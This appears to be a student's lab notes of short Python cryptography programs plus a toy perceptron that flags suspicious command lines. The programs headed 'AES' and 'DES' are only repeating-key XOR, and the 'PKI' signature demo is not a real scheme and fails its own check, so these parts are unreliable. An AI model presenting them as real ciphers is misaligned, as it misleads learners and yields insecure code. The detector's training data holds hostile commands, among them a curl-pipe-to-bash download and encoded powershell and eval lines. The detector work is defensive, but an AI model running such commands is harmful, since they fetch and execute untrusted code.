AES Algoritham
===============================================
def encrypt(text,key1,key2):
    res=""
    for i in range(len(text)):
        c=ord(text[i])^ord(key1[i%len(key1)])
        c=c^ord(key2[i%len(key2)])
        res+=chr(c)
    return res
def decrypt(text,key1,key2):
    res=""
    for i in range(len(text)):
        c=ord(text[i])^ord(key2[i%len(key2)])
        c=c^ord(key1[i%len(key1)])
        res+=chr(c)
    return res
key1="firstkey"
key2="secondky"
msg="welcome to cse"
enc=encrypt(msg,key1,key2)
dec=decrypt(enc,key1,key2)
print(enc)
print(dec)

==========================================
caeser cipher 
=========================================
def caesar_encrypt(text, shift):
    result=""
    for ch in text:
        if ch.isalpha():
            base = 'A' if ch.isupper() else 'a'
            result += chr((ord(ch)-ord(base)+shift)%26 + ord(base))
        else:
            result += ch
    return result

def caesar_decrypt(text, shift):
    return caesar_encrypt(text, -shift)

msg="Meet me very urgently"
enc=caesar_encrypt(msg,3)
dec=caesar_decrypt(enc,3)
print("Encription:",enc)
print("Secryption",dec)

===========================================
DES algpritham
==========================================
def simple_encrypt(text, key):
    cipher_text = ""
    for i in range(len(text)):
        cipher_text += chr(ord(text[i]) ^ ord(key[i % len(key)]))
    return cipher_text

def simple_decrypt(cipher_text, key):
    plain_text = ""
    for i in range(len(cipher_text)):
        plain_text += chr(ord(cipher_text[i]) ^ ord(key[i % len(key)]))
    return plain_text

key = "8bytekey"
msg = "Meet me very urgently"

ct = simple_encrypt(msg, key)
pt = simple_decrypt(ct, key)

print("Cipher Text (unreadable):", ct)
print("Decrypted Text:", pt)


==============================================
ECC algorithm
==============================================
# ecc_demo_fixed_run.py
# ECC toy demo (educational). Uses small parameters and simple EC-ElGamal.
# Not secure — for learning only.

def mod_pow(a, e, m):
    r = 1 % m
    a %= m
    while e:
        if e & 1:
            r = (r * a) % m
        a = (a * a) % m
        e >>= 1
    return r

def inv_mod(a, m):
    # Fermat's little theorem (m must be prime here)
    return mod_pow((a % m + m) % m, m - 2, m)

class Point:
    def __init__(self, x=None, y=None, inf=False):
        self.x = x
        self.y = y
        self.inf = inf  # True if "point at infinity"

    def __repr__(self):
        return "Infinity" if self.inf else f"({self.x},{self.y})"

class Curve:
    def __init__(self, a, b, p):
        self.a = a
        self.b = b
        self.p = p

    def is_on_curve(self, P):
        if P.inf:
            return True
        lhs = (P.y * P.y) % self.p
        rhs = (P.x * P.x * P.x + self.a * P.x + self.b) % self.p
        return lhs == rhs

    def add(self, P, Q):
        if P.inf:
            return Q
        if Q.inf:
            return P
        pmod = self.p
        # P + (-P) = O
        if P.x == Q.x and (P.y + Q.y) % pmod == 0:
            return Point(inf=True)

        if P.x == Q.x and P.y == Q.y:
            num = (3 * P.x * P.x + self.a) % pmod
            den = (2 * P.y) % pmod
        else:
            num = (Q.y - P.y) % pmod
            den = (Q.x - P.x) % pmod

        # If denominator is 0 mod p, inv_mod will attempt inv of 0 -> returns something wrong.
        # We'll catch ZeroDivision-like issues by testing den % p
        if den % pmod == 0:
            return Point(inf=True)
        lam = (num * inv_mod(den, pmod)) % pmod
        xr = (lam * lam - P.x - Q.x) % pmod
        yr = (lam * (P.x - xr) - P.y) % pmod
        return Point(xr, yr)

    def scalar_mul(self, P, k):
        R = Point(inf=True)
        A = P
        n = k
        while n:
            if n & 1:
                R = self.add(R, A)
            A = self.add(A, A)
            n >>= 1
        return R

def encode_message_to_x(msg: str, p: int):
    """Encode message into integer x (big-endian). Return (x, lossy_flag)."""
    x = 0
    for c in msg:
        x = (x << 8) + ord(c)
    if x >= p:
        return x % p, True
    return x, False

def decode_x_to_message(x_val: int):
    """Decode integer back to bytes (big-endian)."""
    if x_val == 0:
        return '\x00'
    bytes_list = []
    rx = x_val
    while rx > 0:
        bytes_list.append(chr(rx & 0xFF))
        rx >>= 8
    bytes_list.reverse()
    return ''.join(bytes_list)

def find_y_for_x(x_val, a, b, p):
    """Brute-force search for y in [0..p-1] such that (x, y) is on curve."""
    rhs = (x_val * x_val * x_val + a * x_val + b) % p
    for y in range(p):
        if (y * y) % p == rhs:
            return y
    return None

def main():
    print("ECC demo (small parameters) using curve y^2 = x^3 + a*x + b (mod p)")
    p = 9739
    a = 497
    b = 1768
    curve = Curve(a, b, p)
    print(f"Params: p={p}, a={a}, b={b}")

    # Generator point
    G = Point(1804, 5368)
    if not curve.is_on_curve(G):
        print("Generator not on curve. Exiting.")
        return

    # Key generation (demo)
    dA = 6534  # private key A
    dB = 8742  # private key B
    QA = curve.scalar_mul(G, dA)
    QB = curve.scalar_mul(G, dB)

    print(f"Public QA = dA*G = {QA}")
    print(f"Public QB = dB*G = {QB}")

    # Input message
    msg = input("Enter a short message (<=6 chars recommended): ")
    x_raw, lossy = encode_message_to_x(msg, p)
    if lossy:
        print("Warning: encoded integer >= p, value reduced modulo p (this loses information).")
    x = x_raw % p

    # find y such that (x, y) on curve
    y_found = find_y_for_x(x, a, b, p)
    if y_found is None:
        print("Failed to find a y for the chosen x (mod p). Try a different (shorter) message.")
        return

    M = Point(x, y_found)
    print(f"Message encoded as point M={M} (x mod p = {x})")

    # Encryption using B’s public key (EC-ElGamal)
    k = 1234  # ephemeral key (demo)
    C1 = curve.scalar_mul(G, k)
    kQB = curve.scalar_mul(QB, k)
    C2 = curve.add(M, kQB)
    print(f"Ciphertext: C1={C1}, C2={C2}")

    # Decryption by B
    dB_C1 = curve.scalar_mul(C1, dB)
    neg = Point(dB_C1.x, (p - dB_C1.y) % p)
    recovered = curve.add(C2, neg)

    if recovered.inf:
        print("Recovered point is point at infinity — decryption failed.")
        return

    print(f"Recovered point: {recovered}")
    recovered_msg = decode_x_to_message(recovered.x)
    print(f"Recovered message (decoded from x): {recovered_msg!r}")

    if recovered.x == M.x and recovered.y == M.y:
        print("Point recovered matches original encoded point (success).")
    else:
        print("Recovered point differs from original encoded point (possible encoding lossy or different y chosen).")

    print("\nNote: toy demo. Real ECC uses proper point encoding schemes (no lossy modulo), standard curves, and secure ephemeral keys.")

if __name__ == "__main__":
    main()




===============================================
Hill Cipher 
==================================================
import numpy as np
def modinv(a,m):
    a=a%m
    for x in range(1,m):
        if (a*x)%m==1:
            return x
    raise Exception("No inv")

def hill_encrypt(plaintext,key):
    n=2
    nums=[ord(c)-97 for c in plaintext.lower().replace(" ","")]
    if len(nums)%n: nums += [23]
    mat=np.array(key).reshape(n,n)
    out=""
    for i in range(0,len(nums),n):
        block=np.array(nums[i:i+n])
        enc=(mat.dot(block))%26
        out += "".join(chr(int(x)+97) for x in enc)
    return out

def hill_decrypt(ciphertext,key):
    n=2
    mat=np.array(key).reshape(n,n)
    det=int(round(np.linalg.det(mat)))%26
    invdet=modinv(det,26)
    adj=np.array([[mat[1,1],-mat[0,1],],[-mat[1,0],mat[0,0]]])
    invmat=(invdet*adj)%26
    out=""
    nums=[ord(c)-97 for c in ciphertext]
    for i in range(0,len(nums),n):
        block=np.array(nums[i:i+n])
        dec=(invmat.dot(block))%26
        out += "".join(chr(int(x)%26+97) for x in dec)
    return out

key=[3,3,2,5]
pt="help"
ct=hill_encrypt(pt,key)
dt=hill_decrypt(ct,key)
print(ct)
print(dt)

============================================
ML 
===========================================
# ml_obfuscation.py
# Tiny perceptron classifier to flag obfuscated / suspicious command strings.
# Educational demo only.

from typing import List
import sys

def extract_features(cmd: str) -> List[float]:
    # Features:
    #   0: length (number of characters)
    #   1: number of suspicious tokens found (like base64, powershell, wget, |, &, \x, eval, etc.)
    #   2: ratio of non-alphanumeric characters to total chars
    #   3: number of long alnum sequences (>=8) (e.g. base64 blobs)
    f = [0.0, 0.0, 0.0, 0.0]
    f[0] = float(len(cmd))

    lower = cmd.lower()
    suspicious = [
        "base64", "powershell", "wget", "curl", "|", "&", ";", "\\x",
        "eval", "fromcharcode", "atob", "cmd.exe", "/c", "exec"
    ]
    cnt = 0
    for tok in suspicious:
        if tok in lower:
            cnt += 1
    f[1] = float(cnt)

    al = 0
    nonal = 0
    for c in cmd:
        if c.isalnum():
            al += 1
        else:
            nonal += 1
    total = al + nonal
    f[2] = (nonal / total) if total > 0 else 0.0

    longseq = 0
    cur = 0
    for c in cmd:
        if c.isalnum():
            cur += 1
        else:
            if cur >= 8:
                longseq += 1
            cur = 0
    if cur >= 8:
        longseq += 1
    f[3] = float(longseq)

    return f

def dot(a: List[float], b: List[float]) -> float:
    return sum(x*y for x,y in zip(a,b))

def train_perceptron(train_set, epochs=200, lr=0.1):
    w = [0.0, 0.0, 0.0, 0.0]
    b = 0.0
    for _ in range(epochs):
        for text, label in train_set:
            x = extract_features(text)
            y_pred = dot(w, x) + b
            pred = 1 if y_pred > 0 else 0
            err = label - pred
            if err != 0:
                for i in range(len(w)):
                    w[i] += lr * err * x[i]
                b += lr * err
    return w, b

def pretty_vec(v):
    return "[" + ", ".join(f"{x:.4f}" for x in v) + "]"

def main():
    # tiny synthetic training dataset
    train = [
        ("ls -la", 0),
        ("cat /etc/passwd", 0),
        ("curl http://example.com/file.sh | bash", 1),
        ("powershell -enc SGVsbG8=", 1),
        ("echo hello", 0),
        ("cmd.exe /c whoami", 1),
        ("python -c \"print('hi')\"", 0),
        ("bash -c 'eval $(echo SGVsbG8= | base64 -d)'", 1)
    ]

    w, b = train_perceptron(train, epochs=200, lr=0.1)

    print("Trained perceptron weights:", pretty_vec(w), " bias=", f"{b:.4f}")
    print("\nEnter a command line to analyze (or pass as program arg):")

    # accept from command-line arg if present, else prompt
    if len(sys.argv) > 1:
        cmd = " ".join(sys.argv[1:])
        print(cmd)
    else:
        try:
            cmd = input().rstrip("\n")
        except EOFError:
            print("No input provided. Exiting.")
            return

    feat = extract_features(cmd)
    score = dot(w, feat) + b

    print("\nFeatures:")
    print(f"  length            = {feat[0]:.0f}")
    print(f"  suspicious tokens = {feat[1]:.0f}")
    print(f"  non-alnum ratio   = {feat[2]:.3f}")
    print(f"  long-alnum seqs   = {feat[3]:.0f}")
    print(f"\nScore = {score:.4f}")
    if score > 0:
        print("Prediction: MALICIOUS / obfuscated command (suspicious)")
    else:
        print("Prediction: Benign / not suspicious")

    print("\nNote: toy classifier trained on a tiny dataset — for real detection use large labeled datasets and proper ML pipelines.")

if __name__ == "__main__":
    main()
===============================================
PKI
=========================================================
def sign(message,private_key):
    s=(message*private_key)%33
    return s
def verify(message,signature,public_key):
    v=(signature*public_key)%33
    return v==message
public_key=3       #20
private_key=11     #5
msg=7
sig=sign(msg,private_key)
ok=verify(msg,sig,public_key)
print(sig)
print(ok)

================================================
RSA algoritham
==========================================
def gcd(a, b):
    while b:
        a, b = b, a % b
    return a

def mod_inverse(e, phi):
    for i in range(1, phi):
        if (e * i) % phi == 1:
            return i

p = 11
q = 13
n = p * q
phi = (p - 1) * (q - 1)
e = 7
d = mod_inverse(e, phi)

msg = 9
print("Public Key (e, n):", e, n)
print("Private Key (d, n):", d, n)

cipher = (msg ** e) % n
plain = (cipher ** d) % n

print("Original Message:", msg)
print("Encrypted Message:", cipher)
print("Decrypted Message:", plain)

=============================================
SHA and MD5
============================================
import hashlib
def hash_sha256(text):
    return hashlib.sha256(text.encode()).hexdigest()
def hash_md5(text):
    return hashlib.md5(text.encode()).hexdigest()

msg="verify this message"
sha=hash_sha256(msg)
md5=hash_md5(msg)
print(sha)
print(md5)

===============================================
substitution cipher
=================================================
import string
def build_map(key):
    letters=string.ascii_lowercase
    mapping={letters[i]:key[i] for i in range(26)}
    inv={v:k for k,v in mapping.items()}
    return mapping,inv

def substitute_encrypt(text,mapping):
    out=""
    for ch in text:
        if ch.isalpha():
            lower=ch.lower()
            enc=mapping[lower]
            out += enc.upper() if ch.isupper() else enc
        else:
            out += ch
    return out

def substitute_decrypt(text,inv):
    out=""
    for ch in text:
        if ch.isalpha():
            lower=ch.lower()
            dec=inv[lower]
            out += dec.upper() if ch.isupper() else dec
        else:
            out += ch
    return out

key="phqgiumeaylnofdxjkrcvstzwb"
mapping,inv=build_map(key)
msg="Welcome to CSE"
enc=substitute_encrypt(msg,mapping)
dec=substitute_decrypt(enc,inv)
print(enc)
print(dec)
